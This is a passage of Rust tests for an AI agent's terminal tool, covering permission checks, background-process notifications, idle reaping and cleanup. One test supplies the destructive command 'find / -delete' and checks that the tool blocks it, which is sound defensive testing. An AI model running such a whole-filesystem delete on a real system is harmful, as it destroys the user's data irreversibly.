                assert!(truncation.is_some());
            }
        }
    }

    #[tokio::test]
    async fn test_daemonization_requires_owner_role() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            1000,
            PermissionMode::Yolo,
            pool,
        )
        .await;

        let response = tool
            .call(
                r#"{"action":"run","command":"nohup sleep 1 &","_session_id":"s1","_user_role":"Guest"}"#,
            )
            .await
            .unwrap();
        assert!(response.contains("only owners can approve"));
    }

    #[tokio::test]
    async fn test_terminal_hard_blocks_broad_irreversible_delete_even_in_yolo() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            1000,
            PermissionMode::Yolo,
            pool,
        )
        .await;

        let response = tool
            .call(r#"{"action":"run","command":"find / -delete","_session_id":"s1","_user_role":"Owner"}"#)
            .await
            .unwrap();
        assert!(response.contains("Blocked irreversible delete"));
        assert!(response.contains("scoped, non-destructive"));
    }

    #[tokio::test]
    async fn test_terminal_blocks_unscoped_recursive_grep() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            1000,
            PermissionMode::Yolo,
            pool,
        )
        .await;

        let response = tool
            .call(
                r#"{"action":"run","command":"grep -rc \"async fn\" .","_session_id":"s1","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(response.contains("Blocked: broad recursive `grep`"));
        assert!(response.contains("search_files"));
        assert!(response.contains("rg -n --glob"));
    }

    #[tokio::test]
    async fn test_background_terminal_completion_enqueues_notification() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_path = db_file.path().display().to_string();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(&db_path, 100, None, embedding_service)
                .await
                .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await
        .with_state(state.clone() as Arc<dyn StateStore>);

        let response = tool
            .call(
                r#"{"action":"run","command":"sleep 2; echo terminal-notify-ok","_session_id":"sess_notify","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(response.contains("Moved to background (pid="));

        let mut found = false;
        for _ in 0..40 {
            let pending = state.get_pending_notifications(20).await.unwrap();
            if pending.iter().any(|entry| {
                entry.session_id == "sess_notify"
                    && entry.notification_type == "progress"
                    && entry.message.contains("terminal-notify-ok")
            }) {
                found = true;
                break;
            }
            tokio::time::sleep(Duration::from_millis(150)).await;
        }
        assert!(
            found,
            "expected background completion notification to be enqueued"
        );
    }

    #[tokio::test]
    async fn test_background_terminal_ack_progress_and_completion_sequence() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_path = db_file.path().display().to_string();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(&db_path, 100, None, embedding_service)
                .await
                .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await
        .with_state(state.clone() as Arc<dyn StateStore>);

        // Emit output early so a periodic ping has something NEW to report —
        // no-output commands are now intentionally quiet until completion.
        let response = tool
            .call(
                r#"{"action":"run","command":"echo working-update; sleep 3; echo terminal-sequence-ok","_session_id":"sess_seq","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(
            response.contains("Moved to background (pid="),
            "expected background ack in tool response, got: {}",
            response
        );

        let mut saw_progress_ping = false;
        let mut saw_completion = false;
        for _ in 0..60 {
            let pending = state.get_pending_notifications(50).await.unwrap();
            for entry in pending.iter().filter(|entry| {
                entry.session_id == "sess_seq" && entry.notification_type == "progress"
            }) {
                if entry.message.contains("Still working on it")
                    && entry.message.contains("working-update")
                {
                    saw_progress_ping = true;
                }
                if entry.message.contains("Done — finished in")
                    || entry.message.contains("finished with errors in")
                {
                    saw_completion = true;
                }
            }
            if saw_progress_ping && saw_completion {
                break;
            }
            tokio::time::sleep(Duration::from_millis(200)).await;
        }

        assert!(
            saw_progress_ping,
            "expected at least one periodic background progress ping"
        );
        assert!(
            saw_completion,
            "expected background completion notification with final output"
        );
    }

    /// A long-running command that produces no output until completion must NOT
    /// spam the user with periodic "still running" pings — only the completion
    /// notification should reach the channel. (The agent already told the user
    /// the command is running.)
    #[tokio::test]
    async fn test_background_terminal_no_output_is_quiet_until_completion() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_path = db_file.path().display().to_string();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(&db_path, 100, None, embedding_service)
                .await
                .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await
        .with_state(state.clone() as Arc<dyn StateStore>);

        let response = tool
            .call(
                r#"{"action":"run","command":"sleep 3","_session_id":"sess_quiet","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(response.contains("Moved to background (pid="));

        let mut saw_progress_ping = false;
        let mut saw_completion = false;
        for _ in 0..60 {
            let pending = state.get_pending_notifications(50).await.unwrap();
            for entry in pending.iter().filter(|entry| {
                entry.session_id == "sess_quiet" && entry.notification_type == "progress"
            }) {
                if entry.message.contains("Still working on it") {
                    saw_progress_ping = true;
                }
                if entry.message.contains("Done — finished in")
                    || entry.message.contains("finished with errors in")
                {
                    saw_completion = true;
                }
            }
            if saw_completion {
                break;
            }
            tokio::time::sleep(Duration::from_millis(200)).await;
        }

        assert!(
            !saw_progress_ping,
            "no-output command should not emit periodic progress pings"
        );
        assert!(
            saw_completion,
            "completion notification should still arrive"
        );
    }

    #[test]
    fn test_should_idle_reap_policy() {
        let stall = Duration::from_secs(120);
        let max_runtime = Duration::from_secs(1200);
        let no = Duration::ZERO;

        // No progress past the stall threshold (well under max runtime) → reap.
        assert!(should_idle_reap(
            true,
            false,
            Duration::from_secs(121),
            Duration::from_secs(200),
            stall,
            max_runtime,
        ));
        // Exactly at the stall threshold → reap (>=).
        assert!(should_idle_reap(
            true,
            false,
            Duration::from_secs(120),
            Duration::from_secs(200),
            stall,
            max_runtime,
        ));
        // Progress recent (no_progress below stall) AND under max runtime → keep.
        assert!(!should_idle_reap(
            true,
            false,
            Duration::from_secs(119),
            Duration::from_secs(200),
            stall,
            max_runtime,
        ));
        // Busy-loop: progress recent (no_progress=0) but total runtime hit the
        // max-runtime backstop → reap.
        assert!(should_idle_reap(
            true,
            false,
            no,
            Duration::from_secs(1200),
            stall,
            max_runtime,
        ));
        assert!(should_idle_reap(
            true,
            false,
            no,
            Duration::from_secs(5000),
            stall,
            max_runtime,
        ));
        // Detached (dev server) → never reaped, even when long idle / long-running.
        assert!(!should_idle_reap(
            true,
            true,
            Duration::from_secs(100_000),
            Duration::from_secs(100_000),
            stall,
            max_runtime,
        ));
        // Not notifier-active (task-owned, no promise to deliver) → not reaped here.
        assert!(!should_idle_reap(
            false,
            false,
            Duration::from_secs(100_000),
            Duration::from_secs(100_000),
            stall,
            max_runtime,
        ));
    }

    #[test]
    fn test_process_made_progress_any_signal_grows() {
        // CPU advanced (silent busy scan statting files) → progress.
        assert!(process_made_progress(100, 150, 0, 0, 0, 0));
        // Disk I/O advanced (silent scan reading directory entries) → progress.
        assert!(process_made_progress(0, 0, 1_000, 2_000, 0, 0));
        // Output grew (streaming) → progress.
        assert!(process_made_progress(0, 0, 0, 0, 10, 25));
        // Nothing advanced (truly stalled) → no progress.
        assert!(!process_made_progress(100, 100, 2_000, 2_000, 25, 25));
        // A carried-forward (equal) signal alone is not progress; any OTHER
        // advancing signal still wins.
        assert!(!process_made_progress(100, 100, 0, 0, 0, 0));
        assert!(process_made_progress(100, 100, 0, 0, 0, 1));
    }

    #[test]
    fn test_sum_subtree_resources_includes_children() {
        // sh wrapper (100) is idle; its du child (101) is churning, with a
        // grandchild (102). The busy descendants must count toward the tracked
        // wrapper pid so a working pipeline is not false-reaped.
        let mut children: HashMap<u32, Vec<u32>> = HashMap::new();
        children.insert(100, vec![101]);
        children.insert(101, vec![102]);
        let mut per_pid: HashMap<u32, (u64, u64)> = HashMap::new();
        per_pid.insert(100, (0, 0));
        per_pid.insert(101, (5_000, 2_000_000));
        per_pid.insert(102, (10, 50));

        let out = sum_subtree_resources(&[100], &children, &per_pid);
        assert_eq!(out.get(&100), Some(&(5_010, 2_000_050)));
    }

    #[test]
    fn test_sum_subtree_resources_isolated_root() {
        // A root with no children sums to just its own values.
        let children: HashMap<u32, Vec<u32>> = HashMap::new();
        let mut per_pid: HashMap<u32, (u64, u64)> = HashMap::new();
        per_pid.insert(42, (123, 456));

        let out = sum_subtree_resources(&[42], &children, &per_pid);
        assert_eq!(out.get(&42), Some(&(123, 456)));
    }

    #[test]
    fn test_sum_subtree_resources_handles_cycle_safely() {
        // A malformed parent->child map containing a cycle (100->101->100)
        // must not infinite-loop; the visited set bounds the traversal and each
        // node is counted at most once.
        let mut children: HashMap<u32, Vec<u32>> = HashMap::new();
        children.insert(100, vec![101]);
        children.insert(101, vec![100]); // cycle back to root
        let mut per_pid: HashMap<u32, (u64, u64)> = HashMap::new();
        per_pid.insert(100, (1, 2));
        per_pid.insert(101, (3, 4));

        let out = sum_subtree_resources(&[100], &children, &per_pid);
        assert_eq!(out.get(&100), Some(&(4, 6)));
    }

    #[test]
    fn test_sum_subtree_missing_pid() {
        // A root absent from per_pid (process exited between snapshot and
        // lookup) contributes nothing → no map entry. The caller carries
        // forward the previous sample, so an absent entry is safe.
        let children: HashMap<u32, Vec<u32>> = HashMap::new();
        let per_pid: HashMap<u32, (u64, u64)> = HashMap::new();

        let out = sum_subtree_resources(&[999], &children, &per_pid);
        assert_eq!(out.get(&999), None);
        assert!(out.is_empty());
    }

    /// A disowned, no-output background command (the `du -ah ~` failure mode) is
    /// stopped by the idle reaper, removed from tracking, and the user is told.
    #[tokio::test]
    async fn test_idle_reap_stops_hung_background_process() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_path = db_file.path().display().to_string();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(&db_path, 100, None, embedding_service)
                .await
                .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await
        .with_state(state.clone() as Arc<dyn StateStore>);

        // No-output, long-running command — stands in for a whole-disk scan that
        // never exits. It is moved to background after the 1s initial timeout.
        let response = tool
            .call(
                r#"{"action":"run","command":"sleep 120","_session_id":"sess_reap","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(response.contains("Moved to background (pid="));

        // Threshold near-zero: the process produced no output, so the reaper sees
        // it as immediately idle and stops it.
        let mut reaped = 0;
        for _ in 0..40 {
            reaped = tool
                .reap_stale_background_processes(Duration::from_millis(1))
                .await;
            if reaped > 0 {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        assert_eq!(
            reaped, 1,
            "expected the hung background process to be reaped"
        );

        // It must be gone from the tracking map (no leak).
        assert!(
            tool.running.lock().await.is_empty(),
            "reaped process should be removed from the running map"
        );

        // The user must be told why it stopped (the screenshot's failure was the
        // bot waiting forever in silence).
        let mut saw_notice = false;
        for _ in 0..20 {
            let pending = state.get_pending_notifications(50).await.unwrap();
            if pending.iter().any(|entry| {
                entry.session_id == "sess_reap"
                    && entry.message.contains("stopped a background command")
            }) {
                saw_notice = true;
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        assert!(
            saw_notice,
            "expected a user-facing notice that the hung command was stopped"
        );
    }

    /// The correction-bridge working_dir helper returns an absolute, canonical
    /// path (so `.`/`..`/symlinks are resolved before the bridge's
    /// `is_unsafe_correction_working_dir` guard — which does NOT canonicalize —
    /// sees it). Canonicalization is what makes the `== "/"` / `== $HOME`
    /// equality checks fire reliably.
    #[test]
    fn test_correction_working_dir_is_canonical_absolute() {
        let dir = TerminalTool::correction_working_dir();
        assert!(
            dir.is_absolute(),
            "correction working_dir must be absolute, got {dir:?}"
        );
        // Canonicalizing an already-canonical path is a fixed point.
        if let Ok(canon) = std::fs::canonicalize(&dir) {
            assert_eq!(
                canon, dir,
                "correction working_dir must already be canonical"
            );
        }
    }

    /// Self-correction bridge: when correction is ENABLED but no agent is wired
    /// (the bridge can't reach the event store / dispatch path), the idle-reaper
    /// must fall back to the EXISTING user notification and dispatch nothing.
    /// This is the safety floor: a misconfigured/half-wired bridge degrades to
    /// today's behavior rather than silently swallowing the notice.
    #[tokio::test]
    async fn test_idle_reap_correction_enabled_no_agent_falls_back_to_notice() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_path = db_file.path().display().to_string();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(&db_path, 100, None, embedding_service)
                .await
                .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);

        // Correction ENABLED + bypass + live (shadow off) — but NO agent wired.
        let live_cfg = SelfCorrectionConfig {
            enabled: true,
            correction_bypass_enabled: true,
            max_attempts: 3,
            shadow_mode: false,
        };
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await
        .with_state(state.clone() as Arc<dyn StateStore>)
        .with_self_correction(live_cfg);

        // Direct unit check of the bridge entry point: no agent → no dispatch.
        let dispatched = tool
            .try_dispatch_idle_reap_remediation(
                "find / -type f -size +100M",
                "sess_reap_noagent",
                None,
                300,
            )
            .await;
        assert!(!dispatched, "no agent wired must NOT dispatch remediation");

        // End-to-end: reap a hung process and confirm the EXISTING notice fires.
        let response = tool
            .call(
                r#"{"action":"run","command":"sleep 120","_session_id":"sess_reap_noagent","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(response.contains("Moved to background (pid="));

        let mut reaped = 0;
        for _ in 0..40 {
            reaped = tool
                .reap_stale_background_processes(Duration::from_millis(1))
                .await;
            if reaped > 0 {
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        assert_eq!(reaped, 1, "expected the hung process to be reaped");

        // The EXISTING "I stopped a background command" notice must still fire —
        // NOT the quieter "retrying a different way" remediation note.
        let mut saw_stopped_notice = false;
        for _ in 0..20 {
            let pending = state.get_pending_notifications(50).await.unwrap();
            if pending.iter().any(|entry| {
                entry.session_id == "sess_reap_noagent"
                    && entry.message.contains("I stopped a background command")
            }) {
                saw_stopped_notice = true;
                break;
            }
            tokio::time::sleep(Duration::from_millis(100)).await;
        }
        assert!(
            saw_stopped_notice,
            "enabled-but-no-agent must fall back to the existing stopped-command notice"
        );
    }

    /// A background command that keeps streaming output is NOT reaped: each new
    /// byte refreshes its idle clock, so a healthy long-running process survives.
    #[tokio::test]
    async fn test_idle_reap_spares_streaming_process() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_path = db_file.path().display().to_string();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(&db_path, 100, None, embedding_service)
                .await
                .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await
        .with_state(state.clone() as Arc<dyn StateStore>);

        // Emits a line roughly every 0.2s for a while — a stand-in for a dev server
        // or a scan that is genuinely making progress.
        let response = tool
            .call(
                r#"{"action":"run","command":"for i in $(seq 1 50); do echo line-$i; sleep 0.2; done","_session_id":"sess_stream","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(response.contains("Moved to background (pid="));

        // Prime the baseline, then sweep again after fresh output has arrived. With
        // a 1s threshold and ~0.2s output cadence, the idle clock keeps resetting,
        // so nothing is reaped.
        let _ = tool
            .reap_stale_background_processes(Duration::from_secs(1))
            .await;
        tokio::time::sleep(Duration::from_millis(600)).await;
        let reaped = tool
            .reap_stale_background_processes(Duration::from_secs(1))
            .await;
        assert_eq!(reaped, 0, "a streaming process must not be idle-reaped");

        // Clean up the still-running process.
        let pids: Vec<u32> = tool.running.lock().await.keys().copied().collect();
        for pid in pids {
            let _ = tool.handle_kill(pid).await;
        }
    }

    #[test]
    fn test_is_short_complete_output_classification() {
        // Short, self-contained results → delivered directly.
        assert!(is_short_complete_output("42"));
        assert!(is_short_complete_output("207"));
        assert!(is_short_complete_output(
            "/Users/davidloor/projects/resume/google"
        ));
        assert!(is_short_complete_output("Build complete"));
        assert!(is_short_complete_output("a\nb\nc")); // 3 lines, tiny

        // Long / multi-line output → still routed through re-engagement.
        let long_line = "x".repeat(SHORT_OUTPUT_DIRECT_DELIVERY_MAX_CHARS + 1);
        assert!(!is_short_complete_output(&long_line));
        let many_lines = "l\n".repeat(SHORT_OUTPUT_DIRECT_DELIVERY_MAX_LINES + 1);
        assert!(!is_short_complete_output(&many_lines));
    }

    #[test]
    fn test_format_short_background_result_message() {
        // One-liner → inline code, no pid, no raw command.
        let one = format_short_background_result("207");
        assert_eq!(one, "Result: `207`");
        assert!(!one.contains("pid"));
        assert!(!one.contains("find"));

        // Multi-line → fenced block.
        let multi = format_short_background_result("a\nb");
        assert!(multi.contains("```"));
        assert!(multi.contains("a\nb"));
    }

    /// A background command whose answer is a short string (a `wc -l` count, a
    /// numeric total, a one-word status) must still deliver that answer to the
    /// user. Regression test for the bug where outputs under 5 chars were
    /// classified as "trivial" and silently dropped — the user asked "how many
    /// resumes?", the count came back short, and only the bare "finished" ping
    /// reached the chat with no number. The short result is delivered directly
    /// (as `Result: ...`), never re-fed into the agent loop.
    #[tokio::test]
    async fn test_background_terminal_short_output_is_delivered() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_path = db_file.path().display().to_string();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(&db_path, 100, None, embedding_service)
                .await
                .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await
        .with_state(state.clone() as Arc<dyn StateStore>);

        // Output "42" (2 chars) — the command text contains 40 and 2 but not 42,
        // so finding "42" in a notification proves the OUTPUT was delivered.
        let response = tool
            .call(
                r#"{"action":"run","command":"sleep 2; echo $((40 + 2))","_session_id":"sess_short","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(response.contains("Moved to background (pid="));

        let mut saw_output = false;
        for _ in 0..60 {
            let pending = state.get_pending_notifications(50).await.unwrap();
            if pending.iter().any(|entry| {
                entry.session_id == "sess_short"
                    && entry.notification_type == "progress"
                    && entry.message.contains("42")
                    // Delivered directly as a short result, NOT via the
                    // re-engagement verbatim fallback (which exposes the raw
                    // command) and NOT dropped as trivial.
                    && entry.message.contains("Result:")
                    && !entry.message.contains("Output from")
            }) {
                saw_output = true;
                break;
            }
            tokio::time::sleep(Duration::from_millis(200)).await;
        }
        assert!(
            saw_output,
            "short background command output (the count the user asked for) must be delivered directly as a short result, not dropped or re-engaged"
        );
    }

    #[tokio::test]
    async fn test_background_terminal_duplicate_result_is_suppressed() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_path = db_file.path().display().to_string();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(&db_path, 100, None, embedding_service)
                .await
                .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await
        .with_state(state.clone() as Arc<dyn StateStore>);

        let first = tool
            .call(
                r#"{"action":"run","command":"sleep 2; echo duplicate-result","_session_id":"sess_dupe_result","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(first.contains("Moved to background (pid="));

        let second = tool
            .call(
                r#"{"action":"run","command":"sleep 2; printf '%s\n' duplicate-result","_session_id":"sess_dupe_result","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(second.contains("Moved to background (pid="));

        for _ in 0..60 {
            let pending = state.get_pending_notifications(50).await.unwrap();
            let result_count = pending
                .iter()
                .filter(|entry| {
                    entry.session_id == "sess_dupe_result"
                        && entry.notification_type == "progress"
                        && entry.message == "Result: `duplicate-result`"
                })
                .count();
            if result_count >= 2 {
                break;
            }
            tokio::time::sleep(Duration::from_millis(200)).await;
        }

        let pending = state.get_pending_notifications(50).await.unwrap();
        let result_count = pending
            .iter()
            .filter(|entry| {
                entry.session_id == "sess_dupe_result"
                    && entry.notification_type == "progress"
                    && entry.message == "Result: `duplicate-result`"
            })
            .count();
        assert_eq!(
            result_count, 1,
            "duplicate background completions should not deliver the same result twice"
        );
    }

    /// A background command that never exits (dev server, watcher) must not
    /// dead-end the conversation: once periodic pings are exhausted, the
    /// notifier sends a one-time "still running" notice (via agent
    /// re-engagement, or the queued fallback when no agent is wired) so the
    /// user learns the process is long-lived instead of waiting forever for
    /// a completion notification that never comes.
    #[tokio::test]
    async fn test_background_terminal_long_running_emits_still_running_notice() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_path = db_file.path().display().to_string();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(&db_path, 100, None, embedding_service)
                .await
                .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await
        .with_state(state.clone() as Arc<dyn StateStore>);

        // Mimic a dev server: readiness output early, then alive without
        // new output and without exiting.
        let response = tool
            .call(
                r#"{"action":"run","command":"echo server-ready; sleep 60","_session_id":"sess_server","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(response.contains("Moved to background (pid="));
        let pid: u32 = response
            .split("pid=")
            .nth(1)
            .and_then(|s| s.split(')').next())
            .and_then(|s| s.parse().ok())
            .expect("pid in background ack");

        let mut saw_still_running_notice = false;
        for _ in 0..80 {
            let pending = state.get_pending_notifications(50).await.unwrap();
            if pending.iter().any(|entry| {
                entry.session_id == "sess_server"
                    && entry.notification_type == "progress"
                    && entry.message.contains("long-lived")
            }) {
                saw_still_running_notice = true;
                break;
            }
            tokio::time::sleep(Duration::from_millis(200)).await;
        }
        assert!(
            saw_still_running_notice,
            "expected a one-time still-running notice after pings are exhausted"
        );

        // Clean up the fake server.
        let _ = tool
            .call(&format!(
                r#"{{"action":"kill","pid":{},"_session_id":"sess_server","_user_role":"Owner"}}"#,
                pid
            ))
            .await;
    }

    #[tokio::test]
    async fn test_background_terminal_kill_suppresses_completion_notification() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_path = db_file.path().display().to_string();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(&db_path, 100, None, embedding_service)
                .await
                .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await
        .with_state(state.clone() as Arc<dyn StateStore>);

        let response = tool
            .call(
                r#"{"action":"run","command":"sleep 10","_session_id":"sess_kill","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        let pid = extract_pid_from_background_message(&response);

        let kill_response = tool
            .call(&format!(
                r#"{{"action":"kill","pid":{},"_session_id":"sess_kill","_user_role":"Owner"}}"#,
                pid
            ))
            .await
            .unwrap();
        assert!(kill_response.contains("stopped"));

        tokio::time::sleep(Duration::from_millis(500)).await;
        let pending = state.get_pending_notifications(20).await.unwrap();
        assert!(
            !pending.iter().any(|entry| {
                entry.session_id == "sess_kill"
                    && entry.notification_type == "progress"
                    && entry.message.contains("Background command finished")
            }),
            "kill action should suppress background completion notification"
        );
    }

    #[tokio::test]
    async fn test_background_terminal_check_returns_result_after_reap() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await;

        let response = tool
            .call(
                r#"{"action":"run","command":"sleep 2; echo post-reap-ok","_session_id":"s1","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        let pid = extract_pid_from_background_message(&response);
        tokio::time::sleep(Duration::from_secs(3)).await;

        // This call will reap finished processes first; check must still return final output.
        let check = tool
            .call(&format!(
                r#"{{"action":"check","pid":{},"_session_id":"s1","_user_role":"Owner"}}"#,
                pid
            ))
            .await
            .unwrap();
        assert!(check.contains("post-reap-ok"));
        assert!(check.contains(&format!("pid={}", pid)));
    }

    #[tokio::test]
    async fn test_task_end_cleanup_kills_task_owned_background_processes() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_url = format!("sqlite:{}", db_file.path().display());
        let pool = SqlitePool::connect(&db_url).await.unwrap();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            2000,
            PermissionMode::Yolo,
            pool,
        )
        .await;

        let response = tool
            .call(
                r#"{"action":"run","command":"sleep 10","_session_id":"s1","_task_id":"task-clean","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(response.contains("Moved to background (pid="));
        let pid = extract_pid_from_background_message(&response);

        tool.on_task_end("task-clean", "s1").await.unwrap();
        tokio::time::sleep(Duration::from_millis(250)).await;

        let check = tool
            .call(&format!(
                r#"{{"action":"check","pid":{},"_session_id":"s1","_user_role":"Owner"}}"#,
                pid
            ))
            .await
            .unwrap();
        assert!(
            check.contains("No tracked process"),
            "expected task-end cleanup to remove process tracking, got: {}",
            check
        );
    }

    #[tokio::test]
    async fn test_task_end_disowns_background_process_with_active_notifier() {
        let db_file = tempfile::NamedTempFile::new().unwrap();
        let db_path = db_file.path().display().to_string();
        let embedding_service = Arc::new(EmbeddingService::new().unwrap());
        let state = Arc::new(
            SqliteStateStore::new(&db_path, 100, None, embedding_service)
                .await
                .unwrap(),
        );
        let pool = state.pool();
        let (approval_tx_raw, _approval_rx) = mpsc::channel::<ApprovalRequest>(1);
        let approval_tx = crate::tools::ApprovalBroker::new(approval_tx_raw);
        let tool = TerminalTool::new(
            vec!["*".to_string()],
            approval_tx,
            1,
            4000,
            PermissionMode::Yolo,
            pool,
        )
        .await
        .with_state(state.clone() as Arc<dyn StateStore>);

        let response = tool
            .call(
                r#"{"action":"run","command":"sleep 3; echo disown-ok","_session_id":"sess_disown","_task_id":"task-disown","_user_role":"Owner"}"#,
            )
            .await
            .unwrap();
        assert!(response.contains("Moved to background (pid="));
        let pid = extract_pid_from_background_message(&response);

        // Task ends — but the notifier is active, so the process should be disowned, not killed.
        tool.on_task_end("task-disown", "sess_disown")
            .await
